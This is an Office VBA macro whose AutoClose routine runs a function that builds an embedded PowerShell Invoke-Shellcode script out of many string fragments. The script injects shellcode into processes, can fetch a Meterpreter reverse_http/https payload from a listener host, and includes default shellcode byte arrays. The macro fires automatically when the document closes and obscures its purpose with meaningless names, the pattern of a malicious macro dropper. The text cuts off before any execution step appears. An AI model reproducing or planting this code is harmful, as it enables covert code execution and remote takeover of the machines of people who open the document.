Sub AutoClose()
        dkN
End Sub

Public Function dkN() As Variant
        Dim OJ As String
        OJ = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        OJ = OJ + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        OJ = OJ + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        OJ = OJ + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        OJ = OJ + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        OJ = OJ + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        OJ = OJ + "    $Shellcode,
    [Parameter( ParameterSetName ="
        OJ = OJ + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        OJ = OJ + "reter/reverse_http',
                  'windows/me"
        OJ = OJ + "terpreter/reverse_https',
                  Ignore"
        OJ = OJ + "Case = $True )]
    [String]
    $Payload = 'windo"
        OJ = OJ + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        OJ = OJ + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        OJ = OJ + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        OJ = OJ + " = $True,
                ParameterSetName = 'Meta"
        OJ = OJ + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        OJ = OJ + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        OJ = OJ + "datory = $True,
                ParameterSetName ="
        OJ = OJ + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        OJ = OJ + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        OJ = OJ + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        OJ = OJ + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        OJ = OJ + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        OJ = OJ + "sion\Internet Settings').'User Agent',
    [Parame"
        OJ = OJ + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        OJ = OJ + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        OJ = OJ + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        OJ = OJ + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        OJ = OJ + "$False,
    [Switch]
    $Force = $False
)
    Set"
        OJ = OJ + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        OJ = OJ + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        OJ = OJ + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        OJ = OJ + "meters['Payload'].Attributes |
            Where-O"
        OJ = OJ + "bject {$_.TypeId -eq [System.Management.Automation"
        OJ = OJ + ".ValidateSetAttribute]}
        foreach ($Payload "
        OJ = OJ + "in $AvailablePayloads.ValidValues)
        {
     "
        OJ = OJ + "       New-Object PSObject -Property @{ Payloads ="
        OJ = OJ + " $Payload }
        }
        Return
    }
    if "
        OJ = OJ + "( $PSBoundParameters['ProcessID'] )
    {
        "
        OJ = OJ + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        OJ = OJ + "-Null
    }
    function Local:Get-DelegateType
  "
        OJ = OJ + "  {
        Param
        (
            [OutputTyp"
        OJ = OJ + "e([Type])]
            [Parameter( Position = 0)]
"
        OJ = OJ + "            [Type[]]
            $Parameters = (Ne"
        OJ = OJ + "w-Object Type[](0)),
            [Parameter( Posit"
        OJ = OJ + "ion = 1 )]
            [Type]
            $ReturnT"
        OJ = OJ + "ype = [Void]
        )
        $Domain = [AppDomai"
        OJ = OJ + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        OJ = OJ + "t System.Reflection.AssemblyName('ReflectedDelegat"
        OJ = OJ + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        OJ = OJ + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        OJ = OJ + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        OJ = OJ + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        OJ = OJ + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        OJ = OJ + "der.DefineType('MyDelegateType', 'Class, Public, S"
        OJ = OJ + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        OJ = OJ + "egate])
        $ConstructorBuilder = $TypeBuilder"
        OJ = OJ + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        OJ = OJ + "ic', [System.Reflection.CallingConventions]::Stand"
        OJ = OJ + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        OJ = OJ + "mplementationFlags('Runtime, Managed')
        $Me"
        OJ = OJ + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        OJ = OJ + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        OJ = OJ + ", $Parameters)
        $MethodBuilder.SetImplement"
        OJ = OJ + "ationFlags('Runtime, Managed')
        Write-Outpu"
        OJ = OJ + "t $TypeBuilder.CreateType()
    }
    function Loc"
        OJ = OJ + "al:Get-ProcAddress
    {
        Param
        (
 "
        OJ = OJ + "           [OutputType([IntPtr])]
            [Par"
        OJ = OJ + "ameter( Position = 0, Mandatory = $True )]
       "
        OJ = OJ + "     [String]
            $Module,
            [Pa"
        OJ = OJ + "rameter( Position = 1, Mandatory = $True )]
      "
        OJ = OJ + "      [String]
            $Procedure
        )
  "
        OJ = OJ + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        OJ = OJ + ".GetAssemblies() |
            Where-Object { $_.G"
        OJ = OJ + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        OJ = OJ + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        OJ = OJ + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        OJ = OJ + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        OJ = OJ + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        OJ = OJ + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        OJ = OJ + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        OJ = OJ + "eropServices.HandleRef], [String]))
        $Kern3"
        OJ = OJ + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        OJ = OJ + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        OJ = OJ + "ndleRef = New-Object System.Runtime.InteropService"
        OJ = OJ + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        OJ = OJ + "Output $GetProcAddress.Invoke($null, @([System.Run"
        OJ = OJ + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        OJ = OJ + "ure))
    }
    function Local:Emit-CallThreadStub"
        OJ = OJ + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        OJ = OJ + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        OJ = OJ + "chitecture / 8
        function Local:ConvertTo-Li"
        OJ = OJ + "ttleEndian ([IntPtr] $Address)
        {
         "
        OJ = OJ + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        OJ = OJ + "           $Address.ToString("X$($IntSizePtr*2)") "
        OJ = OJ + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        OJ = OJ + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        OJ = OJ + " } }
            [System.Array]::Reverse($LittleEn"
        OJ = OJ + "dianByteArray)
            Write-Output $LittleEnd"
        OJ = OJ + "ianByteArray
        }
        $CallStub = New-Obj"
        OJ = OJ + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        OJ = OJ + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        OJ = OJ + "                   # MOV   QWORD RAX, &shellcode
 "
        OJ = OJ + "           $CallStub += ConvertTo-LittleEndian $Ba"
        OJ = OJ + "seAddr       # &shellcode
            $CallStub +="
        OJ = OJ + " 0xFF,0xD0                              # CALL  RA"
        OJ = OJ + "X
            $CallStub += 0x6A,0x00              "
        OJ = OJ + "                # PUSH  BYTE 0
            $CallSt"
        OJ = OJ + "ub += 0x48,0xB8                              # MOV"
        OJ = OJ + "   QWORD RAX, &ExitThread
            $CallStub +="
        OJ = OJ + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        OJ = OJ + "ead
            $CallStub += 0xFF,0xD0            "
        OJ = OJ + "                  # CALL  RAX
        }
        el"
        OJ = OJ + "se
        {
            [Byte[]] $CallStub = 0xB8"
        OJ = OJ + "                           # MOV   DWORD EAX, &she"
        OJ = OJ + "llcode
            $CallStub += ConvertTo-LittleEn"
        OJ = OJ + "dian $BaseAddr       # &shellcode
            $Cal"
        OJ = OJ + "lStub += 0xFF,0xD0                              # "
        OJ = OJ + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        OJ = OJ + "                        # PUSH  BYTE 0
           "
        OJ = OJ + " $CallStub += 0xB8                                "
        OJ = OJ + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        OJ = OJ + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        OJ = OJ + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        OJ = OJ + "                          # CALL  EAX
        }
  "
        OJ = OJ + "      Write-Output $CallStub
    }
    function Lo"
        OJ = OJ + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        OJ = OJ + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        OJ = OJ + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        OJ = OJ + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        OJ = OJ + "        Throw "Unable to open a process handle for"
        OJ = OJ + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        OJ = OJ + "lse
        if ($64bitCPU) # Only perform theses c"
        OJ = OJ + "hecks if CPU is 64-bit
        {
            $IsWo"
        OJ = OJ + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        OJ = OJ + "-Null
            if ((!$IsWow64) -and $PowerShell"
        OJ = OJ + "32bit)
            {
                Throw 'Unable"
        OJ = OJ + " to inject 64-bit shellcode from within 32-bit Pow"
        OJ = OJ + "ershell. Use the 64-bit version of Powershell if y"
        OJ = OJ + "ou want this to work.'
            }
            e"
        OJ = OJ + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        OJ = OJ + "  {
                if ($Shellcode32.Length -eq 0)"
        OJ = OJ + "
                {
                    Throw 'No s"
        OJ = OJ + "hellcode was placed in the $Shellcode32 variable!'"
        OJ = OJ + "
                }
                $Shellcode = $S"
        OJ = OJ + "hellcode32
            }
            else # 64-bit"
        OJ = OJ + " process
            {
                if ($Shellc"
        OJ = OJ + "ode64.Length -eq 0)
                {
            "
        OJ = OJ + "        Throw 'No shellcode was placed in the $She"
        OJ = OJ + "llcode64 variable!'
                }
            "
        OJ = OJ + "    $Shellcode = $Shellcode64
            }
      "
        OJ = OJ + "  }
        else # 32-bit CPU
        {
          "
        OJ = OJ + "  if ($Shellcode32.Length -eq 0)
            {
   "
        OJ = OJ + "             Throw 'No shellcode was placed in the"
        OJ = OJ + " $Shellcode32 variable!'
            }
           "
        OJ = OJ + " $Shellcode = $Shellcode32
        }
        $Remo"
        OJ = OJ + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        OJ = OJ + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        OJ = OJ + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        OJ = OJ + ")
        {
            Throw "Unable to allocate "
        OJ = OJ + "shellcode memory in PID: $ProcessID"
        }
   "
        OJ = OJ + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        OJ = OJ + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        OJ = OJ + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        OJ = OJ + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        OJ = OJ + "      {
            $CallStub = Emit-CallThreadStu"
        OJ = OJ + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        OJ = OJ + "    else
        {
            $CallStub = Emit-Ca"
        OJ = OJ + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        OJ = OJ + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        OJ = OJ + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        OJ = OJ + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        OJ = OJ + "(!$RemoteStubAddr)
        {
            Throw "Un"
        OJ = OJ + "able to allocate thread call stub memory in PID: $"
        OJ = OJ + "ProcessID"
        }
        $WriteProcessMemory.I"
        OJ = OJ + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        OJ = OJ + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        OJ = OJ + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        OJ = OJ + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        OJ = OJ + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        OJ = OJ + "  {
            Throw "Unable to launch remote thr"
        OJ = OJ + "ead in PID: $ProcessID"
        }
        $CloseHa"
        OJ = OJ + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        OJ = OJ + "on Local:Inject-LocalShellcode
    {
        if ($"
        OJ = OJ + "PowerShell32bit) {
            if ($Shellcode32.Le"
        OJ = OJ + "ngth -eq 0)
            {
                Throw 'N"
        OJ = OJ + "o shellcode was placed in the $Shellcode32 variabl"
        OJ = OJ + "e!'
                return
            }
         "
        OJ = OJ + "   $Shellcode = $Shellcode32
        }
        els"
        OJ = OJ + "e
        {
            if ($Shellcode64.Length -e"
        OJ = OJ + "q 0)
            {
                Throw 'No shell"
        OJ = OJ + "code was placed in the $Shellcode64 variable!'
   "
        OJ = OJ + "             return
            }
            $She"
        OJ = OJ + "llcode = $Shellcode64
        }
        $BaseAddre"
        OJ = OJ + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        OJ = OJ + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        OJ = OJ + "X)
        if (!$BaseAddress)
        {
          "
        OJ = OJ + "  Throw "Unable to allocate shellcode memory in PI"
        OJ = OJ + "D: $ProcessID"
        }
        [System.Runtime.I"
        OJ = OJ + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        OJ = OJ + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        OJ = OJ + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        OJ = OJ + "  if ($PowerShell32bit)
        {
            $Cal"
        OJ = OJ + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        OJ = OJ + "adAddr 32
        }
        else
        {
       "
        OJ = OJ + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        OJ = OJ + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        OJ = OJ + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        OJ = OJ + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        OJ = OJ + "X)
        if (!$CallStubAddress)
        {
      "
        OJ = OJ + "      Throw "Unable to allocate thread call stub.""
        OJ = OJ + "
        }
        [System.Runtime.InteropServices"
        OJ = OJ + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        OJ = OJ + "allStub.Length)
        $ThreadHandle = $CreateThr"
        OJ = OJ + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        OJ = OJ + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        OJ = OJ + "dHandle)
        {
            Throw "Unable to la"
        OJ = OJ + "unch thread."
        }
        $WaitForSingleObje"
        OJ = OJ + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        OJ = OJ + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        OJ = OJ + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        OJ = OJ + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        OJ = OJ + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        OJ = OJ + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        OJ = OJ + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        OJ = OJ + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        OJ = OJ + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        OJ = OJ + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        OJ = OJ + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        OJ = OJ + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        OJ = OJ + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        OJ = OJ + "  else
    {
        $64bitCPU = $false
    }
    "
        OJ = OJ + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        OJ = OJ + "l32bit = $true
    }
    else
    {
        $Power"
        OJ = OJ + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        OJ = OJ + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        OJ = OJ + "owerShell32bit) {
            $RootInvocation = $M"
        OJ = OJ + "yInvocation.Line
            $Response = $True
   "
        OJ = OJ + "         if ( $Force -or ( $Response = $psCmdlet.S"
        OJ = OJ + "houldContinue( "Do you want to launch the payload "
        OJ = OJ + "from x86 Powershell?",
                   "Attempt"
        OJ = OJ + " to execute 32-bit shellcode from 64-bit Powershel"
        OJ = OJ + "l. Note: This process takes about one minute. Be p"
        OJ = OJ + "atient! You will also see some artifacts of the sc"
        OJ = OJ + "ript loading in the other process." ) ) ) { }
    "
        OJ = OJ + "        if ( !$Response )
            {
          "
        OJ = OJ + "      Return
            }
            if ($MyInvo"
        OJ = OJ + "cation.BoundParameters['Force'])
            {
   "
        OJ = OJ + "             $Command = "function $($MyInvocation."
        OJ = OJ + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        OJ = OJ + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        OJ = OJ + "   }
            else
            {
              "
        OJ = OJ + "  $Command = "function $($MyInvocation.InvocationN"
        OJ = OJ + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        OJ = OJ + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        OJ = OJ + "
            $CommandBytes = [System.Text.Encoding"
        OJ = OJ + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        OJ = OJ + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        OJ = OJ + "           $Execute = '$Command' + " | $Env:windir"
        OJ = OJ + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        OJ = OJ + "oProfile -Command -"
            Invoke-Expression"
        OJ = OJ + " -Command $Execute | Out-Null
            Return
 "
        OJ = OJ + "       }
        $Response = $True
        if ( $F"
        OJ = OJ + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        OJ = OJ + "Do you know what you're doing?",
               "A"
        OJ = OJ + "bout to download Metasploit payload '$($Payload)' "
        OJ = OJ + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        OJ = OJ + "  if ( !$Response )
        {
            Return
 "
        OJ = OJ + "       }
        switch ($Payload)
        {
     "
        OJ = OJ + "       'windows/meterpreter/reverse_http'
        "
        OJ = OJ + "    {
                $SSL = ''
            }
    "
        OJ = OJ + "        'windows/meterpreter/reverse_https'
      "
        OJ = OJ + "      {
                $SSL = 's'
               "
        OJ = OJ + " [System.Net.ServicePointManager]::ServerCertifica"
        OJ = OJ + "teValidationCallback = {$True}
            }
     "
        OJ = OJ + "   }
        if ($Legacy)
        {
            $R"
        OJ = OJ + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        OJ = OJ + "
        } else {
            $CharArray = 48..57 "
        OJ = OJ + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        OJ = OJ + "         $SumTest = $False
            while ($Sum"
        OJ = OJ + "Test -eq $False)
            {
                $Ge"
        OJ = OJ + "neratedUri = $CharArray | Get-Random -Count 4
    "
        OJ = OJ + "            $SumTest = (([int[]] $GeneratedUri | M"
        OJ = OJ + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        OJ = OJ + "  }
            $RequestUri = -join $GeneratedUri
"
        OJ = OJ + "            $Request = "http$($SSL)://$($Lhost):$("
        OJ = OJ + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        OJ = OJ + "ew-Object Uri($Request)
        $WebClient = New-O"
        OJ = OJ + "bject System.Net.WebClient
        $WebClient.Head"
        OJ = OJ + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        OJ = OJ + "roxy)
        {
            $WebProxyObject = New-"
        OJ = OJ + "Object System.Net.WebProxy
            $ProxyAddre"
        OJ = OJ + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        OJ = OJ + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        OJ = OJ + "oxyServer
            if ($ProxyAddress)
         "
        OJ = OJ + "   {
                $WebProxyObject.Address = $Pr"
        OJ = OJ + "oxyAddress
                $WebProxyObject.UseDefa"
        OJ = OJ + "ultCredentials = $True
                $WebClientO"
        OJ = OJ + "bject.Proxy = $WebProxyObject
            }
      "
        OJ = OJ + "  }
        try
        {
            [Byte[]] $Sh"
        OJ = OJ + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        OJ = OJ + "}
        catch
        {
            Throw "$($Er"
        OJ = OJ + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        OJ = OJ + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        OJ = OJ + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        OJ = OJ + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        OJ = OJ + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        OJ = OJ + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        OJ = OJ + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        OJ = OJ + "                             0x52,0x0c,0x8b,0x52,0"
        OJ = OJ + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        OJ = OJ + "x31,0xc0,
                                  0xac,0"
        OJ = OJ + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        OJ = OJ + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        OJ = OJ + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        OJ = OJ + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        OJ = OJ + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        OJ = OJ + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        OJ = OJ + "x8b,
                                  0x01,0xd6,0"
        OJ = OJ + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        OJ = OJ + "x38,0xe0,0x75,0xf4,
                              "
        OJ = OJ + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        OJ = OJ + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        OJ = OJ + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        OJ = OJ + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        OJ = OJ + "                                  0x5b,0x5b,0x61,0"
        OJ = OJ + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        OJ = OJ + "xeb,0x86,0x5d,
                                  0"
        OJ = OJ + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        OJ = OJ + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        OJ = OJ + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        OJ = OJ + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        OJ = OJ + "                             0x80,0xfb,0xe0,0x75,0"
        OJ = OJ + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        OJ = OJ + "xd5,0x63,
                                  0x61,0"
        OJ = OJ + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        OJ = OJ + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        OJ = OJ + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        OJ = OJ + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        OJ = OJ + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        OJ = OJ + "                             0x20,0x48,0x8b,0x72,0"
        OJ = OJ + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        OJ = OJ + "x31,0xc0,
                                  0xac,0"
        OJ = OJ + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        OJ = OJ + "x41,0x01,0xc1,0xe2,0xed,
                         "
        OJ = OJ + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        OJ = OJ + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        OJ = OJ + "                        0x00,0x00,0x00,0x48,0x85,0"
        OJ = OJ + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        OJ = OJ + "x44,
                                  0x8b,0x40,0"
        OJ = OJ + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        OJ = OJ + "x8b,0x34,0x88,0x48,
                              "
        OJ = OJ + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        OJ = OJ + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        OJ = OJ + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        OJ = OJ + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        OJ = OJ + "                                  0x8b,0x40,0x24,0"
        OJ = OJ + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        OJ = OJ + "x40,0x1c,0x49,
                                  0"
        OJ = OJ + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        OJ = OJ + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        OJ = OJ + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        OJ = OJ + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        OJ = OJ + "                             0x59,0x5a,0x48,0x8b,0"
        OJ = OJ + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        OJ = OJ + "x00,0x00,
                                  0x00,0"
        OJ = OJ + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        OJ = OJ + "x00,0x41,0xba,0x31,0x8b,
                         "
        OJ = OJ + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        OJ = OJ + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        OJ = OJ + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        OJ = OJ + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        OJ = OJ + "x47,
                                  0x13,0x72,0"
        OJ = OJ + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        OJ = OJ + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        OJ = OJ + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        OJ = OJ + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        OJ = OJ + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        OJ = OJ + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        OJ = OJ + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        OJ = OJ + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        OJ = OJ + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        OJ = OJ + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        OJ = OJ + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        OJ = OJ + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        OJ = OJ + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        OJ = OJ + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        OJ = OJ + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        OJ = OJ + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        OJ = OJ + "ernel32.dll WriteProcessMemory
        $WriteProce"
        OJ = OJ + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        OJ = OJ + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        OJ = OJ + "()) ([Bool])
        $WriteProcessMemory = [System"
        OJ = OJ + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        OJ = OJ + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        OJ = OJ + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        OJ = OJ + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        OJ = OJ + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        OJ = OJ + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        OJ = OJ + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        OJ = OJ + "eateRemoteThread = [System.Runtime.InteropServices"
        OJ = OJ + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
